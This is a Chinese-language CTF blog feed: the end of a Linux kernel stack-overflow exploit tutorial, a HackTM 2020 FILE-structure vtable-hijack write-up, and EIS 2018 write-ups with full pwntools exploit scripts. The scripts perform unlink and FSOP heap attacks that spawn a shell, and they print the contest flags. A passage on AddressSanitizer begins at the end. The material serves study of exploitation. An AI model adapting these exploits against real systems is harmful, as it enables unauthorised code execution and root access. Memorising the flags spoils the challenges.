ff+8;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;pushfq;   popq ff+16;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;movw %ss, %ax;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;movq %rax, ff+32;\n&quot;</span>);</span><br><span class="line">	ff.rip	= &amp;shell;</span><br><span class="line">	ff.rsp	= ownstack + (STACK_SIZE / <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE	*fd;</span><br><span class="line">	<span class="keyword">char</span>	buf[<span class="number">8</span> * <span class="number">6</span>];</span><br><span class="line">	<span class="built_in">memset</span>( buf, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(buf) );</span><br><span class="line">	*( (<span class="keyword">void</span> * *) (buf + <span class="number">8</span> * <span class="number">4</span>) ) = &amp;payload;</span><br><span class="line">	<span class="keyword">int</span>		ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>	addr;</span><br><span class="line">	<span class="keyword">char</span>		dummy;</span><br><span class="line">	<span class="keyword">char</span>		sname[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* setup fake frame */</span></span><br><span class="line">	<span class="built_in">fprintf</span>( <span class="built_in">stdout</span>, <span class="string">&quot;[+] preparing fake frame&quot;</span> );</span><br><span class="line">	setup_ff();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* write payload */</span></span><br><span class="line">	<span class="built_in">fprintf</span>( <span class="built_in">stdout</span>, <span class="string">&quot;[+] writing payload to /proc/buggy&quot;</span> );</span><br><span class="line">	fd = fopen( <span class="string">&quot;/proc/buggy&quot;</span>, <span class="string">&quot;w&quot;</span> );</span><br><span class="line">	<span class="keyword">if</span> ( fd == <span class="literal">NULL</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		perror( <span class="string">&quot;fopen()&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fwrite( buf, <span class="keyword">sizeof</span>(buf), <span class="number">1</span>, fd );</span><br><span class="line">	fclose( fd );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译完驱动和exploit后重新打包文件系统并启动Kernel。安装模块后，使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /sys/modules/sbof/section/.text</span><br></pre></td></tr></table></figure>

<p>查看模块代码段地址，并在gdb中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> add-symbols-file sbof.ko &lt;内存位置&gt;</span></span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> b &lt;内存位置&gt;</span></span><br></pre></td></tr></table></figure>

<p>获取<code>commit_creds</code>和<code>prepare_kernel_cred</code>函数的内存地址：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep commit_creds /sys/kallsyms</span><br><span class="line">grep prepare_kernel_cred /sys/kallsyms</span><br></pre></td></tr></table></figure>

<p>执行exploit之前最好切换到非root用户，执行exploit后获取root权限。</p>
<h4 id="gadget搜索"><a href="#gadget搜索" class="headerlink" title="gadget搜索"></a>gadget搜索</h4><p>在性能良好的主机上使用Ropper：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure>

<h3 id="Ubuntu-64位下编译32位程序"><a href="#Ubuntu-64位下编译32位程序" class="headerlink" title="Ubuntu 64位下编译32位程序"></a>Ubuntu 64位下编译32位程序</h3><h4 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make ARCH=i386</span><br></pre></td></tr></table></figure>

<h4 id="Busybox"><a href="#Busybox" class="headerlink" title="Busybox"></a>Busybox</h4><p>修改编译选项</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(-m32 -march&#x3D;i386) Additional CFLAGS</span><br><span class="line">(-m32) Additional LDFLAGS</span><br></pre></td></tr></table></figure>

<h4 id="驱动"><a href="#驱动" class="headerlink" title="驱动"></a>驱动</h4><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> CFLAGS=<span class="string">&quot;-m32&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="参考文章和资料"><a href="#参考文章和资料" class="headerlink" title="参考文章和资料"></a>参考文章和资料</h3><blockquote>
<p><a href="http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2016/06/21/gdb-linux-kernel-by-qemu">http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2016/06/21/gdb-linux-kernel-by-qemu</a></p>
<p><a href="https://www.ibm.com/developerworks/cn/linux/1508_zhangdw_gdb/index.html">https://www.ibm.com/developerworks/cn/linux/1508_zhangdw_gdb/index.html</a></p>
<p><a href="http://sec-redclub.com/archives/636/">http://sec-redclub.com/archives/636/</a></p>
<p>《奔跑吧，Linux内核 入门篇》</p>
</blockquote>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>kernel</tag>
        <tag>pwn</tag>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTM 2020 - TripToTrick WriteUp</title>
    <url>/2020/02/11/HackTM2020-TripToTrick/</url>
    <content><![CDATA[<p>小论文改得蛋疼，看个Pwn缓解下心情。（家里上Github真的慢…怀念北邮的网速）</p>
<a id="more"></a>

<blockquote>
<p>参考：</p>
<p><a href="https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/">https://teamrocketist.github.io/2020/02/05/Pwn-HackTM-2020-Trip-To-Trick/</a></p>
<p><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></p>
</blockquote>
<p>一个经常出的类型的Pwn题，但是环境用了最新的libc-2.29，因此做个记录。</p>
<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><ul>
<li>已知libc地址</li>
<li>两次<code>scanf</code>任意地址写8字节数据</li>
<li>return前关闭<code>stdin</code>、<code>stdout</code>和<code>stderr</code></li>
<li>有沙箱</li>
</ul>
<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><ul>
<li>第一次<code>scanf</code>将<code>_IO_2_1_stdin_</code>的<code>_IO_BUF_END</code>设置为STDIN+0x2000</li>
<li>第二次<code>scanf</code>就可以控制_IO_FILE的结构</li>
<li>将STDOUT的<code>vtable</code>设置为<code>_IO_helper_jumps</code>，<code>flags</code>设置为0来绕过检查</li>
<li>在libc-2.29中，<code>vtable</code>是可写的，因此通过控制<code>_IO_helper_jumps-&gt;__finish</code>来劫持控制流</li>
<li>设置_IO_helper_jumps的__finish为setcontext+0x35</li>
<li>构造ORW的ROP Chain</li>
</ul>
<h2 id="0x02-一些程序分析"><a href="#0x02-一些程序分析" class="headerlink" title="0x02 一些程序分析"></a>0x02 一些程序分析</h2><h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0e 0xc000003e  if (A != ARCH_X86_64) goto 0016</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0b 0xffffffff  if (A != 0xffffffff) goto 0016</span><br><span class="line"> 0005: 0x15 0x09 0x00 0x00000000  if (A == read) goto 0015</span><br><span class="line"> 0006: 0x15 0x08 0x00 0x00000001  if (A == write) goto 0015</span><br><span class="line"> 0007: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0015</span><br><span class="line"> 0008: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0015</span><br><span class="line"> 0009: 0x15 0x05 0x00 0x00000009  if (A == mmap) goto 0015</span><br><span class="line"> 0010: 0x15 0x04 0x00 0x0000000a  if (A == mprotect) goto 0015</span><br><span class="line"> 0011: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0015</span><br><span class="line"> 0012: 0x15 0x02 0x00 0x0000000f  if (A == rt_sigreturn) goto 0015</span><br><span class="line"> 0013: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0015</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0016: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<h3 id="vtable"><a href="#vtable" class="headerlink" title="vtable"></a>vtable</h3><p>在libc-2.29中，vtable区域又重新拥有可写的权限，因此出题人通过nohack函数进行了限制：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nohack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ((_WORD)<span class="built_in">stdout</span> + <span class="number">2208</span>) &amp; <span class="number">0xFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;mprotect error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> mprotect(&amp;<span class="built_in">stdout</span>[<span class="number">10</span>]._IO_write_end, <span class="number">0x700</span>uLL, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是下列vtable仍然可写：</p>
<ul>
<li><p>_IO_helper_jumps</p>
</li>
<li><p>_IO_cookie_jumps</p>
</li>
<li><p>_IO_proc_jumps</p>
</li>
<li><p>_IO_str_chk_jumps</p>
</li>
<li><p>_IO_wstrn_jumps</p>
</li>
<li><p>_IO_wfile_jumps_maybe_mmap</p>
</li>
</ul>
<p>利用其中的函数指针可以控制RIP。</p>
<h3 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Pwn题的基本操作，将缓冲区置0，std将不会使用缓冲区。<code>_IO_buf_base</code>和<code>_IO_buf_end</code>的差值只有1，会使得stdin只能存储一个字节在缓冲区，即回车或空字符（取决于输入形式）。</p>
<p>如果我们通过第一次scanf增加了<code>stdio-&gt;_IO_buf_end</code>的值，将能控制vtable。</p>
<p>除了修改<code>stdout-&gt;vtable</code>为<code>_IO_helper_jumps</code>和修改<code>_IO_helper_jumps</code>中的函数指针外，中间经过的大片内存区域也需要修复而不是简单的进行零填充。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2020</tag>
        <tag>hacktm</tag>
      </tags>
  </entry>
  <entry>
    <title>EIS 2018 pwn writeup</title>
    <url>/2018/11/18/EIS18-pwn/</url>
    <content><![CDATA[<h2 id="hack"><a href="#hack" class="headerlink" title="hack"></a>hack</h2><p>思路与<code>pwnable.kr</code>的<code>unlnk</code>一致，通过unlink操作对栈上的值进行修改，从而将栈劫持到堆上，返回到<code>one_gadget</code>处。可以进行两次泄漏，分别泄漏libc地址和栈地址。</p>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./hack&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;210.32.4.16&#x27;</span>, <span class="number">13375</span>)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc6-i386_2.23-0ubuntu10_amd64.so&#x27;</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;input address: &#x27;</span>)</span><br><span class="line">    p.sendline(str(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    p.recvuntil(str(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + <span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    libc.address = int(recv, <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Second chance: \n&#x27;</span>)</span><br><span class="line">    p.sendline(str(libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    stack_address = int(recv, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(stack_address)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;The address of the node is &#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;, &#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    heap_addr = int(recv, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    target_address = stack_address - (<span class="number">0xffb3d93c</span> - <span class="number">0xffb3d884</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        one_gadget = [<span class="number">0x3ac5c</span>, <span class="number">0x3ac5e</span>, <span class="number">0x3ac62</span>, <span class="number">0x3ac69</span>, <span class="number">0x5fbc5</span>, <span class="number">0x5fbc6</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        one_gadget = [<span class="number">0x3a80c</span>, <span class="number">0x3a80e</span>, <span class="number">0x3a812</span>, <span class="number">0x3a819</span>]</span><br><span class="line"></span><br><span class="line">    payload = p32(libc.address + one_gadget[<span class="number">3</span>]) + p32(heap_addr + <span class="number">12</span>) + p32(heap_addr + <span class="number">0x4</span>) + p32(target_address - <span class="number">0x8</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;fake node now: &#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment"># EIS&#123;d2954e2d38bf6b2ed3ebfead7bb6cd33&#125;</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>师兄说本题这个解法是非预期解，看了出题人的思路后，感觉出题人可能忘了libc中能够泄漏栈地址。</p>
<h2 id="justnote"><a href="#justnote" class="headerlink" title="justnote"></a>justnote</h2><p>程序实现了一般堆题的功能，有<code>Add()</code>、<code>Edit()</code>和<code>Delete()</code>，在<code>Add()</code>中能将用户输入后的chunk内容打印。申请堆块时固定申请0x100，chunk地址和用户输入的长度也保存在堆上，但是保存的地址进行了异或。</p>
<p>初一看没什么问题，后来经师傅提醒，如果输入最大的负数，就能够进行堆溢出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_chunk = (__int64)<span class="built_in">calloc</span>(<span class="number">0x100</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line"><span class="keyword">if</span> ( !new_chunk )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;memory error, contact admin&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;length of note: &quot;</span>, <span class="number">1L</span>L);</span><br><span class="line">length = input_num(); <span class="comment">// vulnerable</span></span><br><span class="line"><span class="keyword">if</span> ( length &lt; <span class="number">0</span> )</span><br><span class="line">  length = -length;</span><br><span class="line"><span class="keyword">if</span> ( length &gt; <span class="number">0xFF</span> )</span><br><span class="line">  length = <span class="number">0xFF</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;note: &quot;</span>);</span><br></pre></td></tr></table></figure>

<p>随后利用这个堆溢出进行FSOP即可。在写exp的时候利用House Of Orange的方法一直有问题，后来先搞定一个0x60的chunk放入small bin，然后再unsorted bin attack和伪造FILE结构体就没问题了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">p, length, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice: &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;length of note: &#x27;</span>, str(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;note: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice: &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index of note: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">p, idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;your choice: &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index of note: &#x27;</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;note: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./justnote&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    LOCAL_LIBC = <span class="number">1</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;210.32.4.17&#x27;</span>, <span class="number">13376</span>)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <span class="comment"># is same as the remote</span></span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Delete(p, <span class="number">0</span>)</span><br><span class="line">    Delete(p, <span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x4440</span> - <span class="number">0x4220</span>)</span><br><span class="line">    Add(p, <span class="number">-9223372036854775808</span>, payload) <span class="comment">#0</span></span><br><span class="line">    p.recvuntil(payload)</span><br><span class="line">    libc_m88_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> LOCAL_LIBC == <span class="number">1</span>:</span><br><span class="line">        libc.address = u64(libc_m88_addr.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f5eae196b78</span> - <span class="number">0x7f5eaddd2000</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;libc base:&#x27;</span> + str(hex(libc.address))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;b&#x27;</span> * (<span class="number">0x108</span>) + p64(<span class="number">0x111</span>) + <span class="string">&#x27;b&#x27;</span> * (<span class="number">0x108</span>) + p64(<span class="number">0x111</span>)</span><br><span class="line">    Edit(p, <span class="number">0</span>, payload)</span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">    Delete(p, <span class="number">0</span>)</span><br><span class="line">    Delete(p, <span class="number">2</span>)</span><br><span class="line">    Delete(p, <span class="number">4</span>)</span><br><span class="line">    payload = <span class="string">&#x27;c&#x27;</span> * (<span class="number">0x5575f99b1448</span> - <span class="number">0x5575f99b1220</span>)</span><br><span class="line">    Add(p, <span class="number">-9223372036854775808</span>, payload) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(payload)</span><br><span class="line">    stack_chunk_4  = p.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    heap_chunk_base = u64(stack_chunk_4.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x55ca81101650</span> - <span class="number">0x55ca81101210</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;heap chunk base:&#x27;</span> + str(hex(heap_chunk_base))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;d&#x27;</span> * (<span class="number">0x108</span>) + p64(<span class="number">0x111</span>) + <span class="string">&#x27;b&#x27;</span> * (<span class="number">0x108</span>) + p64(<span class="number">0x111</span>) + libc_m88_addr + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">2</span> + p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>)</span><br><span class="line">    Edit(p, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;e&#x27;</span> * (<span class="number">0x210</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + libc_m88_addr + <span class="string">&#x27;\x00\x00&#x27;</span> + p64(heap_chunk_base + <span class="number">0x440</span>)</span><br><span class="line">    Edit(p, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Delete(p, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;f&#x27;</span> * <span class="number">0x430</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x110</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>)</span><br><span class="line">    Edit(p, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;g&#x27;</span> * (<span class="number">0x210</span>)</span><br><span class="line">    fake_stream = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">    fake_stream += p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>)</span><br><span class="line">    fake_stream += p64(heap_chunk_base) + p64(heap_chunk_base + <span class="number">1</span>)</span><br><span class="line">    fake_stream = fake_stream.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_stream += p64(heap_chunk_base + <span class="number">0x300</span> - <span class="number">0x10</span>)</span><br><span class="line">    fake_stream = fake_stream.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_stream += <span class="number">3</span> * p64(<span class="number">0</span>) + p64(heap_chunk_base + <span class="number">0x300</span> - <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    payload += fake_stream</span><br><span class="line">    payload += p64(<span class="number">2</span>)</span><br><span class="line">    payload += p64(<span class="number">3</span>)</span><br><span class="line">    payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]) + p64(<span class="number">0</span>) * <span class="number">0x20</span></span><br><span class="line">    Edit(p, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0x70</span>, <span class="string">&#x27;hack by sunichi&#x27;</span>)</span><br><span class="line">    Delete(p, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="comment"># EIS&#123;it_is_2018_and_we_still_mess_around_with_note&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>eis</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title>Learn Address Sanitizer with TCTF 2019 babyaegis</title>
    <url>/2019/03/27/Learn-Address-Sanitizer-with-TCTF-2019-babyaegis/</url>
    <content><![CDATA[<p>比较有趣又能学到新知识的一题。</p>
<a id="more"></a>

<blockquote>
<p>参考论文：</p>
<p>AddressSanitizer: A Fast Address Sanity Checker</p>
</blockquote>
<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>AddressSanitizer(ASan)是一个内存错误检测工具，主要能够检测内存的非法读写、UAF等。</p>
<p>ASan通过Shadow Byte来记录内存空间的状态，每8字节有9个状态，分别标记从低到高Good Byte的数量。全8字节无问题为0，前7～1字节无问题分别为7～1，全部有问题标记为-1。Shadow Byte的位置通过如下计算方式得到：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Shadow = (Addr &gt;&gt; <span class="number">3</span>) + Offset</span><br></pre></td></tr></table></figure>

<p>64位时，Offset为0x7fff8000；32位时，Offset为0x20000000。使用的插桩代码如下：</p>
